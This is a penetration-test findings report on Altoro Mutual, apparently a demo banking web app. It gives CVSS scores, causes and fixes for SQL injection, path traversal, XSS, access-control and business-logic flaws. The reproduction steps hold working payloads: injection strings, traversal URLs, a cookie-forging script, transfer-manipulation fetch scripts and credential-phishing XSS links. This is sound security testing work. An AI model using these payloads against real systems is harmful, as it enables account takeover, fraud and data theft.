---
geometry: margin=2cm
header-includes: |
  \definecolor{bg}{HTML}{f2f2f2}
  \pagecolor{bg}
---

# Findings details

<!-- TODO: Severity after retest -->

## SQL injection in log in

- **Test CVSS severity**: critical
- **Test CVSS score:** 9.3
- **Test CVSS vector:** `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N`
- **Description of the type of the vulnerability:** <https://owasp.org/www-community/attacks/SQL_Injection>
- **Description of the vulnerability:** an attacker can `bypass` the correct username/password check in the login by having the username as `asd' or 1=1 --` and the password as anything.
- **Impact:** severe impact; successful exploitation gives the attacker the ability to bypass login
- **Recommendations:** use prepared statements instead of interpolating user inputs in the login SQL queries

## SQL injection in REST API (accounts)

- **Test CVSS severity**: High
- **Test CVSS score:** 8.7
- **Test CVSS vector:** `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N`
- **Description of the type of the vulnerability:** <https://owasp.org/www-community/attacks/SQL_Injection>
- **Description of the vulnerability:** an attacker can list all bank accounts on the system by passing the username as `asd' or 1=1 --` in the rest api authentication token and submitting a GET request to `/api/account`.
- **Impact:** severe impact; successful exploitation gives the attacker the ability to list all bank accounts on the system
- **Recommendations:** use prepared statements instead of interpolating user inputs in the listing bank accounts SQL queries and in the authentication queries

## SQL injection in transactions listing

- **Test CVSS severity**: High
- **Test CVSS score:** 7.1
- **Test CVSS vector:** `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N`
- **Description of the type of the vulnerability:** <https://owasp.org/www-community/attacks/SQL_Injection>
- **Description of the vulnerability:** an attacker can list all transactions on the system by bypassing the front-end validation in the transactions filtering page and setting the start date as `2018-06-11` and the end date as `2018-06-11 23:59:59') OR 1=1 --`
- **Impact:** severe impact; successful exploitation gives the attacker the ability to list all transactions on the system
- **Recommendations:** use prepared statements instead of interpolating user inputs in the transactions listing SQL queries

<!-- TODO: do finding scenario for this -->

## SQL injection in REST API (transactions)

- **Test CVSS severity**: High
- **Test CVSS score:** 7.1
- **Test CVSS vector:** `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N`
- **Description of the type of the vulnerability:** <https://owasp.org/www-community/attacks/SQL_Injection>
- **Description of the vulnerability:** an attacker can list all transactions on the system by setting the start date as `2018-06-11` and the end date as `2018-06-11 23:59:59') OR 1=1 --` in the transaction listing REST API endpoint (`POST /api/account/800004/transactions`)
- **Impact:** severe impact; successful exploitation gives the attacker the ability to list all bank accounts on the system
- **Recommendations:** use prepared statements instead of interpolating user inputs in the listing bank accounts SQL queries and in the authentication queries

## Unauthorized file access (`Q3_earnings.rtf`)

- **Test CVSS severity**: High
- **Test CVSS score:** 8.7
- **Test CVSS vector:** `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N`
- **Description of the type of the vulnerability:** An attacker can access a file they should not be allowed to access
- **Description of the vulnerability:** an attacker can download the bank's confidential earnings via visiting `/pr/Q3_earnings.rtf`.
- **Impact:** severe impact; successful exploitation gives the attacker the ability to download the bank's confidential earnings
- **Recommendations:** put the earnings file in a directory that is not served on the internet

## Unauthorized file access (`Draft.rtf`)

- **Test CVSS severity**: High
- **Test CVSS score:** 8.7
- **Test CVSS vector:** `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N`
- **Description of the type of the vulnerability:** An attacker can access a file they should not be allowed to access
- **Description of the vulnerability:** an attacker can download the bank's confidential draft via visiting `/pr/Draft.rtf`.
- **Impact:** severe impact; successful exploitation gives the attacker the ability to download the bank's confidential draft
- **Recommendations:** put the draft file in a directory that is not served on the internet

## Path traversal attack

- **Test CVSS severity**: Critical
- **Test CVSS score:** 9.2
- **Test CVSS vector:** `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:H/SI:N/SA:N`
- **Description of the type of the vulnerability:** <https://owasp.org/www-community/attacks/Path_Traversal>
- **Description of the vulnerability:** an attacker can access configuration files that can contain secrets under `WebContent/WEB-INF` by going to `/index.jsp?content=../WEB-INF/name_of_the_file` (e.g, `/index.jsp?content=../WEB-INF/app.properties`)
- **Impact:** severe impact; successful exploitation gives the attacker the ability to access configuration files in the `WebContent/WEB-INF` directory which can contain passwords.
- **Recommendations:** make sure paths served in `index.jsp` do not escape the parent directory (follow OWASP's recommendations in the link above).

## Exploiting business logic flaw (excessive money transfer)

- **Test CVSS severity**: High
- **Test CVSS score:** 7.1
- **Test CVSS vector:** `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N`
- **Description of the type of the vulnerability:** a defect in the business logic (lack of input validation)
- **Description of the vulnerability:** an attacker can transfer an amount (AM) of money from their account (A) to their other account (B) even if the amount (AM) exceeds the balance in account (A).
- **Impact:** severe impact; successful exploitation gives the attacker the ability to put an unlimited amount of money on one of their accounts and put a negative amount of money on another one of their accounts.
- **Recommendations:** make sure the user can not transfer an amount of money that is larger than his account's balance

## Exploiting business logic flaw (excessive money transfer in REST API)

- **Test CVSS severity**: High
- **Test CVSS score:** 7.1
- **Test CVSS vector:** `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N`
- **Description of the type of the vulnerability:** a defect in the business logic (lack of REST API request body validation)
- **Description of the vulnerability:** an attacker can transfer an amount (AM) of money from their account (A) to their other account (B) even if the amount (AM) exceeds the balance in account (A).
- **Impact:** severe impact; successful exploitation gives the attacker the ability to put an unlimited amount of money on one of their accounts and put a negative amount of money on another one of their accounts.
- **Recommendations:** make sure the user can not transfer an amount of money that is larger than his account's balance through the REST API

## Exploiting business logic flaw (negative money transfer in REST API)

- **Test CVSS severity**: High
- **Test CVSS score:** 7.1
- **Test CVSS vector:** `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N`
- **Description of the type of the vulnerability:** a defect in the business logic (lack of REST API request body validation)
- **Description of the vulnerability:** an attacker can transfer a negative amount of money from their account to another account
- **Impact:** severe impact; successful exploitation gives the attacker the ability to transfer a negative amount of money from an account to another leading to an decrease of money in the receiving account and a increase of money in the sending account
- **Recommendations:** make sure the user can not transfer a negative amount of money through the REST API

## Bypassing access control (sending money from a foreign account in the REST API)

- **Test CVSS severity**: High
- **Test CVSS score:** 7.1
- **Test CVSS vector:** `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N`
- **Description of the type of the vulnerability:** a defect in the access control (lack of REST API request body validation)
- **Description of the vulnerability:** an attacker can transfer an amount of money from accounts that do not belong to them
- **Impact:** severe impact; successful exploitation gives the attacker the ability to transfer an amount of money from accounts that do not belong to them
- **Recommendations:** make sure the user can only transfer money from their accounts

## Bypassing access control (sending money from a foreign account through cookie manipulation)

- **Test CVSS severity**: High
- **Test CVSS score:** 7.1
- **Test CVSS vector:** `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N`
- **Description of the type of the vulnerability:** a defect in the access control (treating cookies as a trusted source of truth of the authorities)
- **Description of the vulnerability:** an attacker can transfer an amount of money from accounts that do not belong to them by modifying a cookie that represents what accounts belong to the user
- **Impact:** severe impact; successful exploitation gives the attacker the ability to transfer an amount of money from accounts that do not belong to them
- **Recommendations:** either do not use cookies for determining what accounts belong to the user, or add a verification signature to the cookie.

## Bypassing access control (viewing a foreign account details)

- **Test CVSS severity**: High
- **Test CVSS score:** 7.1
- **Test CVSS vector:** `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N`
- **Description of the type of the vulnerability:** a defect in the access control (not doing backend validation on who is viewing the account)
- **Description of the vulnerability:** an attacker can view the account details of another user through the `/bank/showAccount` page
- **Impact:** severe impact; successful exploitation gives the attacker the ability to view the details of foreign accounts violating their privacy
- **Recommendations:** do backend validation before sending the data to the `/bank/showAccount` page

## Bypassing access control (getting a foreign account details through the REST API)

- **Test CVSS severity**: High
- **Test CVSS score:** 7.1
- **Test CVSS vector:** `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N`
- **Description of the type of the vulnerability:** a defect in the access control (not validating who is GET'ing the account in the REST API)
- **Description of the vulnerability:** an attacker can view the account details of another user through the `GET /api/account` endpoint
- **Impact:** severe impact; successful exploitation gives the attacker the ability to view the details foreign accounts violating their privacy
- **Recommendations:** do proper access control in the `GET /api/account` endpoint

## Bypassing access control (getting a the last ten transactions of a foreign account through the REST API)

- **Test CVSS severity**: High
- **Test CVSS score:** 7.1
- **Test CVSS vector:** `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N`
- **Description of the type of the vulnerability:** a defect in the access control (not validating who is GET'ing the last ten transactions of an account in the REST API)
- **Description of the vulnerability:** an attacker can view the last ten transactions of an account of another user through the `GET /api/account` endpoint
- **Impact:** severe impact; successful exploitation gives the attacker the ability to view the last ten transactions of foreign accounts violating their privacy
- **Recommendations:** do proper access control in the `GET /api/account/{accountNo}/transactions` endpoint

## Bypassing access control (accessing admin pages)

- **Test CVSS severity**: High
- **Test CVSS score:** 8.6
- **Test CVSS vector:** `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N`
- **Description of the type of the vulnerability:** a defect in the access control (improper validation on who is accessing the admin pages)
- **Description of the vulnerability:** an attacker can view the admin pages and take admin actions by visiting `/admin/admin.jsp`
- **Impact:** severe impact; successful exploitation gives the attacker admin privileges
- **Recommendations:** do proper access control on admin pages and actions

## Cross site scripting in `/bank/customize.jsp`

- **Test CVSS severity**: High
- **Test CVSS score:** 8.6
- **Test CVSS vector:** `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N`
- **Description of the type of the vulnerability:** <https://owasp.org/www-community/attacks/xss/>
- **Description of the vulnerability:** an attacker can inject arbitrary HTML/CSS/JavaScript by putting them in the `lang` parameter in `/bank/customize.jsp`
- **Impact:** severe impact; an attacker can send such link to other users; the link appears as if it is genuine but it can contain an evil script or form that can cause the victim's data to be stolen
- **Recommendations:** follow OWASP's recommendations in the link in the description of the type of the vulnerability

## Cross site scripting in `/search.jsp`

- **Test CVSS severity**: High
- **Test CVSS score:** 8.6
- **Test CVSS vector:** `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N`
- **Description of the type of the vulnerability:** <https://owasp.org/www-community/attacks/xss/>
- **Description of the vulnerability:** an attacker can inject arbitrary HTML/CSS/JavaScript by putting them in the `query` parameter in `/search.jsp`
- **Impact:** severe impact; an attacker can send such link to other users; the link appears as if it is genuine but it can contain an evil script or form that can cause the victim's data to be stolen
- **Recommendations:** follow OWASP's recommendations in the link in the description of the type of the vulnerability

## Cross site scripting in `/util/serverStatusCheckService.jsp`

- **Test CVSS severity**: High
- **Test CVSS score:** 8.6
- **Test CVSS vector:** `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N`
- **Description of the type of the vulnerability:** <https://owasp.org/www-community/attacks/xss/>
- **Description of the vulnerability:** an attacker can inject arbitrary HTML/CSS/JavaScript by putting them in the `HostName` parameter in `/util/serverStatusCheckService.jsp`
- **Impact:** severe impact; an attacker can send such link to other users; the link appears as if it is genuine but it can contain an evil script or form that can cause the victim's data to be stolen
- **Recommendations:** follow OWASP's recommendations in the link in the description of the type of the vulnerability

## Cross site scripting in `/bank/queryxpath.jsp`

- **Test CVSS severity**: High
- **Test CVSS score:** 8.6
- **Test CVSS vector:** `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N`
- **Description of the type of the vulnerability:** <https://owasp.org/www-community/attacks/xss/>
- **Description of the vulnerability:** an attacker can inject arbitrary HTML/CSS/JavaScript by putting them in the `content` parameter in `/altoromutual/bank/queryxpath.jsp?content=queryxpath.jsp&query=%22/%3E%3Cscript%3Ealert(%27xss%20injected%27)%3C/script%3E`
- **Impact:** severe impact; an attacker can send such link to other users; the link appears as if it is genuine but it can contain an evil script or form that can cause the victim's data to be stolen
- **Recommendations:** follow OWASP's recommendations in the link in the description of the type of the vulnerability

# Finding scenarios

<!-- Fixing steps, re-test steps -->

## SQL injection in log in

### Test steps

- Open /login.jsp
- Login with the following credentials (password can be anything):

![Log in injected](image-2.png)

- Observe that you are logged in as the first user in the system:

![After log in injected](image-1.png)

### Cause

`DBUtil.isValidUser()` method interpolates the user input in the SQL query; hence making the attacker able to execute arbitrary queries. The resulting query becomes:

```sql
SELECT COUNT(*) FROM PEOPLE WHERE USER_ID = 'asd' or 1=1 -- AND PASSWORD='anything'")
```

## SQL injection in REST API (accounts)

### Test steps

- Run the following script in your browser's dev tools' console while on the website (F12 > console):

  ```javascript
  username = "asd' or 1=1 --";
  password = 'asd';
  res = await (
    await fetch('/altoromutual/api/login', {
      headers: { 'Content-Type': 'application/json' },
      method: 'POST',
      body: JSON.stringify({
        username,
        password
      })
    })
  ).json();

  auth = res.Authorization;

  await (
    await fetch('/altoromutual/api/account', {
      headers: { Authorization: auth }
    })
  ).json();
  ```

- Observe how all bank accounts are returned:

![All bank accounts returned from REST API](image-3.png)

### Cause

- `DBUtil.getUserInfo()` method interpolates the user input in the SQL query; hence making the attacker able to execute arbitrary queries. The resulting query becomes:
  ```sql
  SELECT FIRST_NAME,LAST_NAME,ROLE FROM PEOPLE
  WHERE USER_ID = 'asd' or 1=1 --
  ```
- `DBUtil.getUserInfo()` returns the received username in the parameter rather than the one retrieved from the database (since it assumes they would be the same)
- `DBUtil.getAccounts()` is then called with the modified username and also interpolates the SQL query with the user input; hence the resulting query becomes:
  ```sql
  SELECT ACCOUNT_ID, ACCOUNT_NAME, BALANCE FROM ACCOUNTS
  WHERE USERID = 'asd' or 1=1 --
  ```
  leading to returning all of the users in the database

## SQL injection in transactions listing

### Test steps

- Go to `/bank/transaction.jsp`
- Run the following javascript code in the browser console while on the page (F12 > console):

  ```javascript
  Form1.onsubmit = undefined;
  ```

![Bypass transactions filtering frontend validation](image.png)

- Set the start date as `2018-06-11` and the end date as `2018-06-11 23:59:59') OR 1=1 --`:

![Setting the start date and the end date of transactions filtering](image-4.png)

- Click submit and observe how all of the transactions on the system are shown:

![All of the transactions on the system are shown](image-5.png)

### Cause

`DBUtil.getTransactions()` method interpolates the user input in the SQL query; hence making the attacker able to execute arbitrary queries. The resulting query becomes:

```sql
SELECT * FROM TRANSACTIONS
WHERE (ACCOUNTID = 800004)
AND (DATE BETWEEN '2018-06-11 00:00:00' AND '2018-06-11 23:59:59')
OR 1=1 -- 23:59:59') ORDER BY DATE DESC
```

## Unauthorized file access (`Q3_earnings.rtf`)

### Test steps

- Click on "INSIDE ALTORO MUTUAL":

![Inside Altoro Mutual](image-6.png)

- Click on "2006 community annual report":

![2006 community annual report](image-7.png)

- Change the last part of the URL to `Q3_earning.rtf`:

![Q3 earnings download](image-8.png)

- Download and view the file:

![Q3 earnings](image-9.png)

### Cause

Everything under the `WebContent` directory and not in the `WEB-INF` directory is served by Tomcat.

## Unauthorized file access (`Draft.rtf`)

### Test steps

- Click on "INSIDE ALTORO MUTUAL":

![Inside Altoro Mutual](image-6.png)

- Click on "2006 community annual report":

![2006 community annual report](image-7.png)

- Change the last part of the URL to `Draft.rtf`:

![Draft download](image-10.png)

- Download and view the file:

![Draft](image-11.png)

### Cause

Everything under the `WebContent` directory and not in the `WEB-INF` directory is served by Tomcat.

## Path traversal attack

### Test steps

- Visit `/index.jsp?content=../WEB-INF/app.properties` and observe an application configuration file get leaked

![app.properties getting leaked](image-12.png)

- Visit `/index.jsp?content=../WEB-INF/web.xml` and observe an application configuration file get leaked

![web.xml getting leaked](image-13.png)

### Cause

In `index.jsp`, content is served from the `static/` directory using user provided subdirectories which can include dot-dot-slashes (`../`)

## Exploiting business logic flaw (excessive money transfer)

### Test steps

- Go to `View Account Summary`:

![View account summary](image-14.png)

- Select an account (A) and make note of the available balance:

![A available balance](image-15.png)

- Select an account (B) and make note of the available balance:

![B available balance](image-18.png)

- Go to `Transfer Funds`, change the `To Account` and make note of it, enter an amount that is larger than the balance, click `Transfer Money`:

![Transferring funds](image-16.png)

- Click `Transfer Money` and notice how the operation succeeds:

![Transferring funds succeeded](image-17.png)

- View the available balance in account (A) and notice how it becomes negative:

![Negative balance](image-19.png)

- View the available balance in account (B) and notice how it increases:

![Increased balance](image-20.png)

### Cause

`OperationsUtil.doServletTransfer` does not check the available balance.

## Exploiting business logic flaw (excessive money transfer in REST API)

### Test steps

- Enter the following script while on the website (F12 > console), and observe how excessive funds (funds that are greater than 800005's balance) are sent to 800004 account:

  ```javascript
  username = 'jdoe';
  password = 'demo1234';
  res = await (
    await fetch('/altoromutual/api/login', {
      headers: { 'Content-Type': 'application/json' },
      method: 'POST',
      body: JSON.stringify({
        username,
        password
      })
    })
  ).json();

  auth = res.Authorization;

  res = await (
    await fetch('/altoromutual/api/transfer', {
      headers: { 'Content-Type': 'application/json', Authorization: auth },
      method: 'POST',
      body: JSON.stringify({
        toAccount: '800004',
        fromAccount: '800005',
        transferAmount: '1000000000000'
      })
    })
  ).json();
  ```

![Sending excessive funds via REST API](image-21.png)

- Confirm that the funds are sent as in the previous vulnerability

### Cause

`OperationsUtil.doApiTransfer` does not do business logic checks before calling `DBUtil.transferFunds`.

## Exploiting business logic flaw (negative money transfer in REST API)

### Test steps

- Run the following script in the browser's console while on the website (F12 > console), and observe the negative funds get sent successfully:

  ```javascript
  username = 'jdoe';
  password = 'demo1234';
  res = await (
    await fetch('/altoromutual/api/login', {
      headers: { 'Content-Type': 'application/json' },
      method: 'POST',
      body: JSON.stringify({
        username,
        password
      })
    })
  ).json();

  auth = res.Authorization;

  res = await (
    await fetch('/altoromutual/api/transfer', {
      headers: { 'Content-Type': 'application/json', Authorization: auth },
      method: 'POST',
      body: JSON.stringify({
        toAccount: '800005',
        fromAccount: '800004',
        transferAmount: '-2000000'
      })
    })
  ).json();
  ```

![Transferring negative funds](image-22.png)

- Confirm the new balances as in the previous vulnerability

### Cause

`OperationsUtil.doApiTransfer` does not do business logic checks before calling `DBUtil.transferFunds`.

## Bypassing access control (sending money from a foreign account in the REST API)

### Test steps

- Run the following script in your browser's dev tools' console while on the website (F12 > console), and observe how funds get sent from 800000 to 800004 although 800000 does not belong to the sending user:

![Transferring money from a foreign account](image-23.png)

- Confirm the new balances as in the previous vulnerability

### Cause

`OperationsUtil.doApiTransfer` does not do business logic checks before calling `DBUtil.transferFunds`.

## Bypassing access control (sending money from a foreign account through cookie manipulation)

### Test steps

- Login with Jane Doe's account (jdoe, demo1234)

- Go to `My Account` > `Transfer Funds`:

![My Account > Transfer Funds](image-24.png)

- Run the following javascript code in the browser console while on the page (F12 > console):
  ```javascript
  evilCookie = btoa('800000~evil~101|800004~Savings~101');
  document.cookie = `AltoroAccounts=${evilCookie}`;
  opt = document.createElement('option');
  opt.value = '800000';
  opt.innerHTML = '800000 victim';
  fromAccount.appendChild(opt);
  ```

![Adding an evil cookie](image-25.png)

- Choose "800000 victim" from the "from" dropdown list (notice that it does not belong to Jane Doe), choose one of your accounts from the "to" drop down list and enter an amount of money:

![Transferring money from the victim](image-26.png)

- Click `Transfer Money` and notice how the operation is successful:

![Transferring money from the victim successful](image-27.png)

### Cause

`OperationsUtil.doServletTransfer()` checks for a cookie called `AltoroAccounts`, and if it exists, it uses it to determine the user's accounts. This cookie can be modified on the client side.

## Bypassing access control (viewing a foreign account details)

### Test steps

- Go to "View Account Summary" > "Go" (on any account)

![Account details](image-30.png)

- Change the `listAccounts` URL parameter to a bank account number of another user, and observe how their account details are returned

![Foreign account details](image-31.png)

### Cause

`balance.jsp` does not check if the account id belongs to the logged in user and the database does not filter the accounts based on the logged in user

## Bypassing access control (getting a foreign account details through the REST API)

### Test steps

Run the following script in your browser's dev tools' console while on the website (F12 > console), and observe how you can get the details of the 800000 account which does not belong to `jdoe`:

```javascript
username = 'jdoe';
password = 'demo1234';
res = await (
  await fetch('/altoromutual/api/login', {
    headers: { 'Content-Type': 'application/json' },
    method: 'POST',
    body: JSON.stringify({
      username,
      password
    })
  })
).json();

auth = res.Authorization;

res = await (
  await fetch('/altoromutual/api/account/800000', {
    headers: { 'Content-Type': 'application/json', Authorization: auth },
    method: 'GET'
  })
).json();
```

![Getting a foreign account details](image-28.png)

### Cause

`AccountAPI.getAccountBalance()` does not check whether the account in the parameter belongs to the user and the database does not filter the accounts based on the user

## Bypassing access control (getting a the last ten transactions of a foreign account through the REST API)

### Test steps

Run the following script in your browser's dev tools' console while on the website (F12 > console), and observe how you can get the last ten transactions of the 800002 account which does not belong to `jdoe`:

```javascript
username = 'jdoe';
password = 'demo1234';
res = await (
  await fetch('/altoromutual/api/login', {
    headers: { 'Content-Type': 'application/json' },
    method: 'POST',
    body: JSON.stringify({
      username,
      password
    })
  })
).json();

auth = res.Authorization;

res = await (
  await fetch('/altoromutual/api/account/800002/transactions', {
    headers: { 'Content-Type': 'application/json', Authorization: auth },
    method: 'GET'
  })
).json();
```

![Getting foreign last ten transactions](image-29.png)

### Cause

`AccountAPI.showLastTenTransactions()` does not check whether the account in the parameter belongs to the user and the database does not filter the transactions based on the user

## Bypassing access control (accessing admin pages)

### Test steps

- Log in as a non-admin user

![Logging in as a normal user](image-32.png)

- Visit /admin/admin.jsp and observe how the user can access admin pages

![Accessing admin pages](image-33.png)

### Cause

The admin URL pattern in `AdminFilter` in `web.xml` is misspelled (`/adimn/*` instead of `/admin/*`)

## Cross site scripting in `/bank/customize.jsp`

### Test steps

- Log in as any user (you will be the victim)

- Visit `/bank/customize.jsp?lang=%3Cbr%3E%3Cform%3E%3Clabel%3Eevil%20username%3C/label%3E%3Cinput%20type=%27text%27%3E%3Cbr%3E%3Clabel%3Eevil%20password%3C/label%3E%3Cinput%20type=%27password%27%3E%3Cinput%20type=%27submit%27%3E%3C/form%3E` and observe how an evil form was injected:

![Evil form in customize.jsp](image-34.png)

### Cause

`customize.jsp` does not sanitize the request parameter before placing it on the DOM

## Cross site scripting in `/search.jsp`

### Test steps

- You are the victim, visit `/search.jsp?query=%3Cform%3E%3Clabel%3Eevil+username%3C%2Flabel%3E%3Cinput+type%3D%22text%22%3E%3Cbr%3E%3Clabel%3Eevil+password%3C%2Flabel%3E%3Cinput+type%3D%22password%22%3E%3C%2Fform%3E` and observe how an evil form was injected:

![Evil form in search.jsp](image-35.png)

### Cause

`search.jsp` does not sanitize the request parameter before placing it on the DOM

## Cross site scripting in `/util/serverStatusCheckService.jsp`

### Test steps

- You are the victim, visit `/util/serverStatusCheckService.jsp?HostName=%3Cscript%3Ealert(%22XSS%20injected%22)%3C/script%3E` and observe how an arbitrary script is run

![Evil script in serverStatusCheckService.jsp](image-36.png)

### Cause

`serverStatusCheckService.jsp` does not sanitize the request parameter before placing it on the DOM

## Cross site scripting in `/bank/queryxpath.jsp`

### Test steps

- Log in as any user (you will be the victim)

- Visit `/bank/queryxpath.jsp?content=queryxpath.jsp&query=%22/%3E%3Cscript%3Ealert(%27xss%20injected%27)%3C/script%3E` and observe how an arbitrary script is run

![Evil script in queryxpath.jsp](image-37.png)

### Cause

`queryxpath.jsp` does not sanitize the request parameter before placing it on the DOM
